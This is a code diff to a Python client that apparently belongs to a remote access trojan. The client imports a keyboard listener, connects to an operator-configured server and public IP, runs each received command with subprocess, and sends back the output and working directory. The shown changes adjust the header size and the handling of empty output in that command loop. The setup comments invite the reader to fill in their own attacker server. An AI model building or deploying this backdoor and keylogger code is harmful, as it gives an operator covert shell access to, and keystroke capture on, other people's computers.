@@ -4,7 +4,7 @@ import os
 import subprocess
 from pynput.keyboard import Listener, Key
 
-HEADER = 2048
+HEADER = 8192
 PORT = 0  # Replace 0 With Your Port Number
 SERVER = "localhost"  # Replace localhost With Your Public IP
 clientnum = "client_name"  # Replace client_name With Any Name You Haven't Used Before, No Spaces
@@ -76,6 +76,8 @@ while True:
                 output = e
         else:
             output = subprocess.getoutput(command)
+            if not output:
+                output = "non"
         cwd = os.getcwd()
         output = str(output)
         send(clientnum + "<?CLIENT?>" + output + "<sep>" + cwd)
